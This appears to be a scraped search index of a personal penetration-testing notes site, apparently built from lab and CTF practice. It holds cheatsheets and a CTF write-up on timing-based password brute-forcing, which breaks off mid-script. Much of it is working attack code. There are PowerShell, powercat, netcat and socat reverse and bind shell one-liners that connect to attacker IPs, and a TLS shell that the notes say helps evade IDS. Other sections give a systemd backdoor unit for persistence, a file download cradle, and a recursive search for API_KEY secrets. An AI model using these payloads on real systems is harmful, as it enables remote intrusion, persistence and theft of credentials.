powercat sudo apt install powercat Then copy over /usr/share/windows-resources/powercat/powercat.ps1 Run . .\\powercat.ps1 Then you can use powercat mostly in place of netcat Bind Shell powercat -l -p 443 -e cmd . exe Reverse Shell powercat -c 10 . 11 . 0 . 4 -p 443 -e cmd . exe Generate a standalone script for reverse shell powercat -c 10 . 11 . 0 . 4 -p 443 -e cmd . exe -g > reverseshell . ps1 Generate a base64 encoded standalone script for reverse shell powercat -c 10 . 11 . 0 . 4 -p 443 -e cmd . exe -ge > reverseshellencoded . ps1","title":"Powershell"},{"location":"cheatsheets/powershell/#man-pages","text":"To get information about a cmdlet, use the Get-Help cmdlet. eg. Get-Help Get-Process To see example usages, pass the -Examples flag","title":"Man Pages"},{"location":"cheatsheets/powershell/#syntax","text":"Case insensitive Backtick to escape characters Can use | to pipe the output of a cmdlet into another Note As the output of cmdlets are objects not raw strings, it is different from a bash pipe","title":"Syntax"},{"location":"cheatsheets/powershell/#execution-policy","text":"By default, only signed scripts can be run, this can be chagned with Set-ExecutionPolicy -Scope CurrentUser Bypass If you have Admin, you can leave out the -Scope CurrentUser","title":"Execution Policy"},{"location":"cheatsheets/powershell/#useful-commands","text":"","title":"Useful Commands"},{"location":"cheatsheets/powershell/#get-command","text":"Roughly equivalent to which in bash Lists commands on the current computer. Supports pattern matching eg. Get-Command New -*","title":"Get-Command"},{"location":"cheatsheets/powershell/#get-member","text":"Gets properties and methods of objects TODO: Work out what that means","title":"Get-Member"},{"location":"cheatsheets/powershell/#get-childitem","text":"Roughly like ls in bash eg. List files and directories in Desktop folder Get-ChildItem .\\ Desktop \\ To see hidden files use -Force eg. An agnozing example Get-ChildItem -Path C :\\ -Force -Recurse -ErrorAction SilentlyContinue -Include interesting -file *","title":"Get-ChildItem"},{"location":"cheatsheets/powershell/#get-content","text":"Get contents of file, like bash cat command.","title":"Get-Content"},{"location":"cheatsheets/powershell/#select-object","text":"Pull out properties from output of another cmdlet. eg. To list just the mode and name for files/dirs within the current directory Get-ChildItem | Select-Object -Property Mode , Name eg. Get first 5 items in current directory (like head in bash) Get-ChildItem | Select-Object -First 5 eg. Get last 5 items in current directory (like tail in bash) Get-ChildItem | Select-Object -Last 5 Other useful flags: - Index - Unique - Skip - ExcludeProperty","title":"Select-Object"},{"location":"cheatsheets/powershell/#where-object","text":"Only select objects that match a filter. Sort of like grep . eg. List files modified after 10/4/2019 Get-ChildItem | Where-Object -Property LastWriteTime -GT 10 / 4 / 2019 Useful operators: -Contains - if collection has item that exactly matches -EQ - Exactly equal -LT -GT -GE - Greater than or equal For more details: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.1#examples","title":"Where-Object"},{"location":"cheatsheets/powershell/#sort-object","text":"Kinda like bash sort command. Useful flags: -Unique Example I don't understand: Get-Service | Sort-Object -Property @{ Expression = \"Status\" ; Descending = $True }, @{ Expression = \"DisplayName\" ; Descending = $False }","title":"Sort-Object"},{"location":"cheatsheets/powershell/#base64","text":"Powershell does not have a native way to do Base64 encode / decode so instead you can do Decoding $data = Get-Content .\\ b64 . txt $decoded = [System.Text.Encoding] :: ASCII . GetString ( [System.Convert] :: FromBase64String ( $data )) Encoding $decoded = Get-Content .\\ somefile . txt $encoded = [Convert] :: ToBase64String ( [Text.Encoding] :: UTF8 . GetBytes ( $decoded ))","title":"Base64"},{"location":"cheatsheets/powershell/#other-useful-commands","text":"Measure-Object - like wc Invoke-Webrequest - like curl or wget Get-FileHash - like md5sum Get-Location - like pwd Get-LocalUser - list users Get-LocalGroup - list groups Get-NetIPAddress - like ip addr Get-NetTCPConnection - like netstat -t Get-HotFix - list installed updates","title":"Other Useful Commands"},{"location":"cheatsheets/powershell/#other-tasks","text":"Find files containing the string \"API_KEY\" Get-ChildItem -ErrorAction SilentlyContinue -Recurse -Path C :\\ | Select-String -ErrorAction SilentlyContinue \"API_KEY\" -List | Select Path Download a file ( New-Object System . Net . WebClient ). DownloadFile ( 'http://10.11.0.4/wget.exe' , 'C:\\Users\\Public\\wget.exe' ) Reverse Shell $client = New-Object System . Net . Sockets . TCPClient ( '192.168.119.154' , 9001 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ) { $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 >& 1 | Out-String ); $sendback2 = $sendback + 'PS ' + ( pwd ). Path + '> ' ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush (); } $client . Close (); Or as a one liner powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()\" Bind Shell powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"","title":"Other Tasks"},{"location":"cheatsheets/powershell/#powercat","text":"\"I just want netcat\" Download powercat sudo apt install powercat Then copy over /usr/share/windows-resources/powercat/powercat.ps1 Run . .\\powercat.ps1 Then you can use powercat mostly in place of netcat Bind Shell powercat -l -p 443 -e cmd . exe Reverse Shell powercat -c 10 . 11 . 0 . 4 -p 443 -e cmd . exe Generate a standalone script for reverse shell powercat -c 10 . 11 . 0 . 4 -p 443 -e cmd . exe -g > reverseshell . ps1 Generate a base64 encoded standalone script for reverse shell powercat -c 10 . 11 . 0 . 4 -p 443 -e cmd . exe -ge > reverseshellencoded . ps1","title":"Powercat"},{"location":"cheatsheets/privesc/","text":"Most of the contents of this were redacted before publication, sorry General Principles \u00b6 What information can you obtain from X? What trust relations are compromised by you controlling X? Linux \u00b6 https://github.com/carlospolop/PEASS-ng https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist Windows \u00b6 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS","title":"Priv Esc"},{"location":"cheatsheets/privesc/#general-principles","text":"What information can you obtain from X? What trust relations are compromised by you controlling X?","title":"General Principles"},{"location":"cheatsheets/privesc/#linux","text":"https://github.com/carlospolop/PEASS-ng https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist","title":"Linux"},{"location":"cheatsheets/privesc/#windows","text":"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS","title":"Windows"},{"location":"cheatsheets/rpc/","text":"\"Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.\" Can be enumerated with sudo nmap -sSUC -p111 10 .11.1.72","title":"RPC (Remote Procedure Call)"},{"location":"cheatsheets/rustscan/","text":"Like NMAP (actually semi wraps nmap) but very fast because rust. Syntax \u00b6 rustscan 10 .1.1.100 -- <nmapargs> This will do the initial port scan with rust, and then call nmap with -Pn -p PORTS where ports are the ports that are open","title":"Rustscan"},{"location":"cheatsheets/rustscan/#syntax","text":"rustscan 10 .1.1.100 -- <nmapargs> This will do the initial port scan with rust, and then call nmap with -Pn -p PORTS where ports are the ports that are open","title":"Syntax"},{"location":"cheatsheets/shells/","text":"netcat (bsd variant) \u00b6 Requires nc to be using BSD version of netcat (most common variant) Full Length \u00b6 #!/bin/bash LHOST = \" ${ LHOST :- 10 .4.32.196 } \" LPORT = \" ${ LPORT :- 1235 } \" rm /tmp/f mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2 > & 1 | nc $LHOST $LPORT > /tmp/f One Liner \u00b6 rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc \" ${ LHOST :- 10 .4.32.196 } \" \" ${ LPORT :- 1235 } \" >/tmp/f netcat (traditional) \u00b6 For Linux nc -e /bin/bash 192 .168.119.154 9001 For Windows nc -e C :\\ Windows \\ System32 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe 192 . 168 . 119 . 154 9001 Nice PTY \u00b6 Not good for stealth, but lovely for usability python3 -c \"import pty; pty.spawn('/bin/bash')\"","title":"Shells"},{"location":"cheatsheets/shells/#netcat-bsd-variant","text":"Requires nc to be using BSD version of netcat (most common variant)","title":"netcat (bsd variant)"},{"location":"cheatsheets/shells/#full-length","text":"#!/bin/bash LHOST = \" ${ LHOST :- 10 .4.32.196 } \" LPORT = \" ${ LPORT :- 1235 } \" rm /tmp/f mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2 > & 1 | nc $LHOST $LPORT > /tmp/f","title":"Full Length"},{"location":"cheatsheets/shells/#one-liner","text":"rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc \" ${ LHOST :- 10 .4.32.196 } \" \" ${ LPORT :- 1235 } \" >/tmp/f","title":"One Liner"},{"location":"cheatsheets/shells/#netcat-traditional","text":"For Linux nc -e /bin/bash 192 .168.119.154 9001 For Windows nc -e C :\\ Windows \\ System32 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe 192 . 168 . 119 . 154 9001","title":"netcat (traditional)"},{"location":"cheatsheets/shells/#nice-pty","text":"Not good for stealth, but lovely for usability python3 -c \"import pty; pty.spawn('/bin/bash')\"","title":"Nice PTY"},{"location":"cheatsheets/smb/","text":"SMB used commonly by Windows for file sharing and way more. Most common linux server is samba. Nmap Enumeration \u00b6 SMB Enum of users and shares nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse 10 .1.2.3 Explore \u00b6 Interact live with smbclient //10.1.2.3/someshare Or in a file manager go to smb://10.1.2.3/","title":"SMB Cheatsheet"},{"location":"cheatsheets/smb/#nmap-enumeration","text":"SMB Enum of users and shares nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse 10 .1.2.3","title":"Nmap Enumeration"},{"location":"cheatsheets/smb/#explore","text":"Interact live with smbclient //10.1.2.3/someshare Or in a file manager go to smb://10.1.2.3/","title":"Explore"},{"location":"cheatsheets/socat/","text":"Socat establishes two bidirectional byte streams and transfers data between them Note Socat uses ip : port notation General usage socat <SRC> <DST> Example for stdin/stdout to webserver socat - TCP4:192.168.1.80:80 File transfer sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt Shell listener socat -d -d TCP4-LISTEN:443 STDOUT Shell payload socat TCP4:10.11.0.22:443 EXEC:/bin/bash TLS Shell \u00b6 Socat can use TLS to help evade network IDS. Generate cert openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt Enter random data for the cert cat bind_shell.crt bind_shell.key > bind_shell.pem Bind Shell \u00b6 Payload sudo socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:/bin/bash Connect with socat - OPENSSL:10.1.2.3:443,verify = 0 Reverse Shell \u00b6 Listen with sudo socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 - Payload socat OPENSSL : 192 . 168 . 119 . 154 : 443 , verify = 0 EXEC : 'powershell.exe' , pipes","title":"Socat"},{"location":"cheatsheets/socat/#tls-shell","text":"Socat can use TLS to help evade network IDS. Generate cert openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt Enter random data for the cert cat bind_shell.crt bind_shell.key > bind_shell.pem","title":"TLS Shell"},{"location":"cheatsheets/socat/#bind-shell","text":"Payload sudo socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:/bin/bash Connect with socat - OPENSSL:10.1.2.3:443,verify = 0","title":"Bind Shell"},{"location":"cheatsheets/socat/#reverse-shell","text":"Listen with sudo socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 - Payload socat OPENSSL : 192 . 168 . 119 . 154 : 443 , verify = 0 EXEC : 'powershell.exe' , pipes","title":"Reverse Shell"},{"location":"cheatsheets/suid/","text":"SetUID (and SetGID) binaries in Linux will run as the owner user (or group) when executed instead of the current user. These files are specified by first octet in the permissions of the file. Permission On Files On Directories SUID Bit User executes the file with permission of the file owner - SGID Bit User executes the file with the permission of the group owner Files created in directory gets the same group owner Sticky Bit - Users are prevented from deleting files from other users Finding \u00b6 find / -perm -u = s -type f 2 >/dev/null Filtering \u00b6 Automatic tool: https://github.com/Anon-Exploiter/SUID3NUM As many binaries are meant to be setuid, this is a list of binaries from Kali that are suid to filter against. /usr/bin/bwrap /usr/bin/chfn /usr/bin/chsh /usr/bin/fusermount3 /usr/bin/gpasswd /usr/bin/mount /usr/bin/newgrp /usr/bin/ntfs-3g /usr/bin/passwd /usr/bin/pkexec /usr/bin/su /usr/bin/sudo /usr/bin/umount /usr/lib/chromium/chrome-sandbox /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/xorg/Xorg.wrap /usr/sbin/mount.cifs /usr/sbin/mount.nfs /usr/sbin/pppd Bash Gotcha \u00b6 By default, bash will drop suid privs unless the -p flag is provided","title":"SUID/SGID"},{"location":"cheatsheets/suid/#finding","text":"find / -perm -u = s -type f 2 >/dev/null","title":"Finding"},{"location":"cheatsheets/suid/#filtering","text":"Automatic tool: https://github.com/Anon-Exploiter/SUID3NUM As many binaries are meant to be setuid, this is a list of binaries from Kali that are suid to filter against. /usr/bin/bwrap /usr/bin/chfn /usr/bin/chsh /usr/bin/fusermount3 /usr/bin/gpasswd /usr/bin/mount /usr/bin/newgrp /usr/bin/ntfs-3g /usr/bin/passwd /usr/bin/pkexec /usr/bin/su /usr/bin/sudo /usr/bin/umount /usr/lib/chromium/chrome-sandbox /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/xorg/Xorg.wrap /usr/sbin/mount.cifs /usr/sbin/mount.nfs /usr/sbin/pppd","title":"Filtering"},{"location":"cheatsheets/suid/#bash-gotcha","text":"By default, bash will drop suid privs unless the -p flag is provided","title":"Bash Gotcha"},{"location":"cheatsheets/systemd-backdoor/","text":"If systemctl has setuid to root (not that this should ever happen), this can escalate privs In a TryHackMe room, I had execution as www-data , meaning that I could write to /var/www/html due to being writable by user. Unit \u00b6 ```unit file (systemd) [Unit] Description=example systemd service unit file. [Service] ExecStart=/bin/bash /var/www/html/revshell.sh [Install] WantedBy=multi-user.target Assuming `/var/www/html/revshell.sh` is a reverse shell To setup ```bash mkdir -p /var/www/html/services cat > /var/www/html/services/myshell.service << EOF [Unit] Description=example systemd service unit file. [Service] ExecStart=/bin/bash /var/www/html/revshell.sh [Install] WantedBy=multi-user.target EOF systemctl link /var/www/html/services/myshell.service systemctl start myshell.service","title":"SystemD Backdoor Unit"},{"location":"cheatsheets/systemd-backdoor/#unit","text":"```unit file (systemd) [Unit] Description=example systemd service unit file. [Service] ExecStart=/bin/bash /var/www/html/revshell.sh [Install] WantedBy=multi-user.target Assuming `/var/www/html/revshell.sh` is a reverse shell To setup ```bash mkdir -p /var/www/html/services cat > /var/www/html/services/myshell.service << EOF [Unit] Description=example systemd service unit file. [Service] ExecStart=/bin/bash /var/www/html/revshell.sh [Install] WantedBy=multi-user.target EOF systemctl link /var/www/html/services/myshell.service systemctl start myshell.service","title":"Unit"},{"location":"cheatsheets/tcpdump/","text":"CLI Packet Capture tool, uses eBPF under the hood which is pretty cool Flag Description -n Skip DNS resolution -r file.pcap Read PCAP -i eno1 Listen on interface -X Print packet data in ASCII and HEX Examples \u00b6 Only traffic from 172.16.40.10 sudo tcpdump -n src host 172 .16.40.10 Only port 81 traffic sudo tcpdump -n port 81 Only show TCP data packets (PSH, ACK) sudo tcpdump -n 'tcp[13] = 24'","title":"TCPDump"},{"location":"cheatsheets/tcpdump/#examples","text":"Only traffic from 172.16.40.10 sudo tcpdump -n src host 172 .16.40.10 Only port 81 traffic sudo tcpdump -n port 81 Only show TCP data packets (PSH, ACK) sudo tcpdump -n 'tcp[13] = 24'","title":"Examples"},{"location":"cheatsheets/terminal/","text":"Many tips and tricks for efficient usage of terminals. Bash/Zsh Cursor Control \u00b6 Shortcut Description Ctrl + Left Previous word Ctrl + Right Next word Home Start of line End End of line Ctrl + U Clear current line Ctrl + L Clear screen Ctrl + R Search history Terminator Shortcuts \u00b6 Note This assumes you're using terminator as configured in this repo's ansible role an ansible role that I wrote and haven't published, so... your mileage may vary Shortcut Description Win + Right Split terminal right Win + Down Split terminal down Alt + Down Select down Alt + Up Select up Alt + Left Select left Alt + Right Select right Ctrl + Shift + T Create tab Ctrl + Page Down Next tab Ctrl + Page Up Previous tab Ctrl + Alt + R Rename tab Ctrl + Alt + X Rename window Ctrl + Shift + X Toggle terminal zoom (make single pane takeup full window temporarily) Ctrl + Shift + [ Broadcast key presses to all shells in tab Ctrl + Shift + ] Stop broadcasting keys to all shells Example Layout \u00b6 Create second tab ( Ctrl + Shift + T ) Name tab \"Recon\" ( Ctrl + Alt + R ) Split in half to right ( Win + Right ) Split right panel in half down ( Win + Down ) If you need to ssh into a machine (like a kali VM) and cd to a directory on multiple windows in the frame, you can use Ctrl + Shift + [ Terminator Plugins \u00b6 Terminator has multiple plugins that can be enabled with Right Click > Preferences > Plugins Some useful plugins are listed below Activity Watch \u00b6 Right Click > Watch for Activity and when the terminal has activity it will show a desktop notification Logger \u00b6 Right Click > Logger will prompt for a location to save a log file, once you stop logging it will save","title":"Linux Terminal Tricks"},{"location":"cheatsheets/terminal/#bashzsh-cursor-control","text":"Shortcut Description Ctrl + Left Previous word Ctrl + Right Next word Home Start of line End End of line Ctrl + U Clear current line Ctrl + L Clear screen Ctrl + R Search history","title":"Bash/Zsh Cursor Control"},{"location":"cheatsheets/terminal/#terminator-shortcuts","text":"Note This assumes you're using terminator as configured in this repo's ansible role an ansible role that I wrote and haven't published, so... your mileage may vary Shortcut Description Win + Right Split terminal right Win + Down Split terminal down Alt + Down Select down Alt + Up Select up Alt + Left Select left Alt + Right Select right Ctrl + Shift + T Create tab Ctrl + Page Down Next tab Ctrl + Page Up Previous tab Ctrl + Alt + R Rename tab Ctrl + Alt + X Rename window Ctrl + Shift + X Toggle terminal zoom (make single pane takeup full window temporarily) Ctrl + Shift + [ Broadcast key presses to all shells in tab Ctrl + Shift + ] Stop broadcasting keys to all shells","title":"Terminator Shortcuts"},{"location":"cheatsheets/terminal/#example-layout","text":"Create second tab ( Ctrl + Shift + T ) Name tab \"Recon\" ( Ctrl + Alt + R ) Split in half to right ( Win + Right ) Split right panel in half down ( Win + Down ) If you need to ssh into a machine (like a kali VM) and cd to a directory on multiple windows in the frame, you can use Ctrl + Shift + [","title":"Example Layout"},{"location":"cheatsheets/terminal/#terminator-plugins","text":"Terminator has multiple plugins that can be enabled with Right Click > Preferences > Plugins Some useful plugins are listed below","title":"Terminator Plugins"},{"location":"cheatsheets/terminal/#activity-watch","text":"Right Click > Watch for Activity and when the terminal has activity it will show a desktop notification","title":"Activity Watch"},{"location":"cheatsheets/terminal/#logger","text":"Right Click > Logger will prompt for a location to save a log file, once you stop logging it will save","title":"Logger"},{"location":"cheatsheets/windows-permissions/","text":"TODO: Flesh Out this doc \u00b6 Reference: https://www.exploit-db.com/papers/42556 https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens Commonly abused privileges \u00b6 SeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege","title":"Windows Permissions"},{"location":"cheatsheets/windows-permissions/#todo-flesh-out-this-doc","text":"Reference: https://www.exploit-db.com/papers/42556 https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens","title":"TODO: Flesh Out this doc"},{"location":"cheatsheets/windows-permissions/#commonly-abused-privileges","text":"SeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege","title":"Commonly abused privileges"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/","text":"An interesting password guessing challenge Challenge Description \u00b6 To guess at things randomly is not to guess at all. Only through being methodical can enlightenment be achieved Note : This challenge has a second part which is a trophy challenge. You must be the first verified team to submit PwdGuessr2 to win the trophy. We have learned that the Demon-tron server has very particular requirements for their users' passwords. We have also managed to learn how those passwords are checked: def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return False if p != s : time . sleep ( 0.5 ) # Add a delay to stop password-guessing attacks return False return True nc $target_dns $target_port Play Along at Home \u00b6 During the CTF, the challenge was hosted at pwdguessr.chal.cybears.io:2323 To play after the CTF, run docker run --name pwdguessr1 -dp 2323 :2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr and then change the host in the scripts to 127.0.0.1 Walkthrough \u00b6 Initial Recon \u00b6 From the definition of check_pwd given in the challenge description, it appears that when submitting a password there are three possible outcomes: Success - If we get the password entirely correct Delayed Failure - If the attempted password is not a prefix of the real password, there will be a 500ms delay Immediate Failure - If the attempted password is a prefix of the real password, it will return immediately Connecting to the challenge with nc pwdguessr.chal.cybears.io 2323 shows the prompt Welcome, user 5909559. Please enter your password: The initial welcome user with ID changes on each connection, this hints at something we discover later which is that every connection the password changes. Entering a random password lead to a brief pause, followed by the response Sorry, that password was incorrect. Please enter your password: Note The response does not end with a newline, so recvline will not work while scripting this Bruteforce \u00b6 To get a better idea of the passwords, a script was written to iteratively bruteforce character by character, continuing whenever an attempted password does not cause a 500ms delay. Note Script requires pwntools for providing a nice wrapper around the socket and tqdm for progress bars After a bit of iterating on the script due to realizing a timeout occurred after a while, it looked like import string from pwn import * from tqdm import tqdm alphabet = string . ascii_lowercase + string . digits + string . ascii_uppercase host = \"pwdguessr.chal.cybears.io\" port = 2323 r = remote ( host , port ) user_line = r . recvline () . decode () user = user_line . split ( \" \" )[ - 1 ][: - 2 ] r . recvuntil ( \"Please enter your password: \" ) class SuccessfulConnection ( Exception ): pass class Timeout ( Exception ): pass class NotFound ( Exception ): pass def check ( password ): before = time . time () r . sendline ( password ) out = r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout raise SuccessfulConnection ( out . decode ()) after = time . time () r . recvuntil ( \"Please enter your password: \" ) delta = after - before return delta < 0.5 def main ( password : str = \"\" ): log . setLevel ( \"DEBUG\" ) while True : for c in tqdm ( alphabet ): if check ( password + c ): password += c log . debug ( f \"password= { password } \" ) break else : raise NotFound ( password ) if __name__ == '__main__' : main () Running this a couple of times, yielded a few prefixes before failing thurs sunda monda Wordlists \u00b6 Due to the prefixes appearing to be days of the week, the script was adapted to try these first import string from pwn import * from tqdm import tqdm alphabet = string . ascii_lowercase + string . digits + string . ascii_uppercase host = \"pwdguessr.chal.cybears.io\" port = 2323 r = remote ( host , port ) user_line = r . recvline () . decode () user = user_line . split ( \" \" )[ - 1 ][: - 2 ] r . recvuntil ( \"Please enter your password: \" ) days = [ \"monday\" , \"tuesday\" , \"wednesday\" , \"thursday\" , \"friday\" , \"saturday\" , \"sunday\" ] class SuccessfulConnection ( Exception ): pass class Timeout ( Exception ): pass class NotFound ( Exception ): pass def check ( password : str ): before = time . time () r . sendline ( password ) out = r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout raise SuccessfulConnection ( out . decode ()) after = time . time () r . recvuntil ( \"Please enter your password: \" ) delta = after - before return delta < 0.5 def brute ( password : str = \"\" ): while True : for c in tqdm ( alphabet ): if check ( password + c ): password += c log . debug ( f \"password= { password } \" ) break else : raise NotFound ( password ) def guess_days ( password : str = \"\" ): for day in days : test = password + day log . debug ( f \"Checking: { test } \" ) if check ( test ): return test else : log . warn ( \"Falling back to bruteforce\" ) return brute ( password ) def main (): log . setLevel ( \"DEBUG\" ) password = guess_days () password = brute ( password ) if __name__ == '__main__' : main () Running this discovered more of the prefix, specifically that the passwords began with a day of the week followed by either episode or harry . To accomodate the multiple wordlists, guess_days was refactored into a guess_words function # SNIP def guess_words ( words : List [ str ], password : str = \"\" , fallback = True ): for word in words : test = password + word log . debug ( f \"Checking: { test } \" ) if check ( test ): log . debug ( f \"Found: { test } \" ) return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return brute ( s ) else : return None def main (): log . setLevel ( \"DEBUG\" ) password = guess_words ( days ) password = guess_words ([ \"episode\" , \"harry\" ]) password = brute ( password ) # SNIP This revealed that the second segment of the password was either of the form harrypotterandthe (name of harry potter movie with no spaces) or episodeonetheph (or any of the 9 Starwars movies) Adapting the script def main (): log . setLevel ( \"DEBUG\" ) password = guess_words ( days ) password = guess_words ([ \"episode\" , \"harrypotterandthe\" ]) if password . endswith ( \"episode\" ): s = guess_words ( starwars_episodes , password ) elif password . endswith ( \"harrypotterandthe\" ): s = guess_words ( potter_movies , password ) password = brute ( password ) Note I've skipped over a fair amount of trial and error while tweaking the wordlists to get the correct movie names Optimisation - Guess Prefixes \u00b6 At this point, I decided to slightly optimize my guesses so that I could Simplify my wordlists Reduce number of guesses prior to bruteforce, so I get more info before timing out I noticed that when guessing from a wordlist, some words had common prefixes, which could be guessed independently. from collections import Counter # SNIP def guess_words_smart ( words , password : str = \"\" ): # Don't bother with divide and conquer for two passwords if len ( words ) <= 2 : return guess_words ( words , password ) # Get most common first letters first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : # If no common first letters just revert to guessing words return guess_words ( words , password ) # List of letters that have more than one word in list starting with them, ordered by first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return guess_words_smart ( words , new_s ) With this optimisation, I could join the starwars episodes and harry potter movies wordlists without sacrificing performance. def main (): log . setLevel ( \"DEBUG\" ) password = guess_words_smart ( days ) password = guess_words_smart ( movies , password ) brute ( password ) More Wordlists \u00b6 With the optimisation out of the way, was able to bruteforce more of the next section of the password. After a few prefixes were recovered, I recognised they were elements of the periodic table and added that as a wordlist def main (): log . setLevel ( \"DEBUG\" ) password = guess_words_smart ( days ) password = guess_words_smart ( movies , password ) password = guess_words_smart ( elements , password ) brute ( password ) Note What I did not realize at this point was that a few elements were spelled differently in the periodic table I used as a reference. This was uncovered during PwdGuessr 2 , but caused unexplained failure in ~4% of attempts. Even More Wordlists \u00b6 Running the script a few more times revealed that the next (and last) part of the password were words from the Nato phonetic alphabet. After adding the nato word list, running the script gave the file Full Source \u00b6 pwdguessr.py \u00b6 from pwn import * from tqdm import tqdm from collections import Counter from pwdguessrlists import ( elements , days , nato_phonetic , movies , ) # host = \"pwdguessr.chal.cybears.io\" host = \"127.0.0.1\" port = 2323 alphabet = string . ascii_lowercase r = remote ( host , port ) user_line = r . recvline () . decode () user = user_line . split ( \" \" )[ - 1 ][: - 2 ] print ( r . recvuntil ( \"Please enter your password: \" )) class SuccessfulConnection ( Exception ): pass class NotFound ( Exception ): pass class Timeout ( Exception ): pass def check ( x ): before = time . time () r . sendline ( x ) out = r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout raise SuccessfulConnection ( out . decode ()) after = time . time () r . recvuntil ( \"Please enter your password: \" ) delta = after - before return delta < 0.5 def brute ( s : str = \"\" ): while True : for c in tqdm ( alphabet ): if check ( s + c ): s += c print ( f \"s= { s } \" ) break else : raise NotFound ( \"Brute\" ) def guess_words ( words , s : str = \"\" , fallback = True ): for word in words : test = s + word log . debug ( f \"Checking: { test } \" ) if check ( test ): return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return brute ( s ) else : return None def guess_words_smart ( words , s : str = \"\" ): # Napkin maths says 3 is a good number if len ( words ) < 3 : return guess_words ( words , s ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return guess_words ( words , s ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = guess_words ( first_letters_s , s , fallback = False ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return guess_words_smart ( new_words , s ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return guess_words_smart ( words , new_s ) def main (): log . setLevel ( \"DEBUG\" ) try : s = guess_words_smart ( days ) log . info ( f \"Partial: { s !r} \" ) s = guess_words_smart ( movies , s ) log . info ( f \"Partial: { s !r} \" ) s 